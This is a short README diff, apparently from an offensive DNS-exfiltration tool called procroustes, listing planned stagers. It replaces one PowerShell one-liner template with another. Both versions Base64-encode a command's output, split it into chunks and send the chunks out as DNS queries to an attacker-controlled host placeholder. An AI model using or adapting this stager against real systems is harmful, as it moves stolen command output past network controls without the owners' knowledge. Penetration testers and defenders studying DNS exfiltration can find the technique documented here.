@@ -102,7 +102,7 @@ A workaround to avoid running into issues for the aforementioned cases is to fir
  - Add stagers for sh (could be a massage of the bash stager), powershell (something similar with [this](https://github.com/no0be/DNSlivery/blob/731ace1eb35b7499cc7b95e22816a371507cbd40/dnslivery.py#L136))
  - procroustes_full/powershell command can use some parallelization:
  ```bash
-[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%)+(echo "`n%SIGNATURE%"))) -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
 ```
 PRs are welcome
 
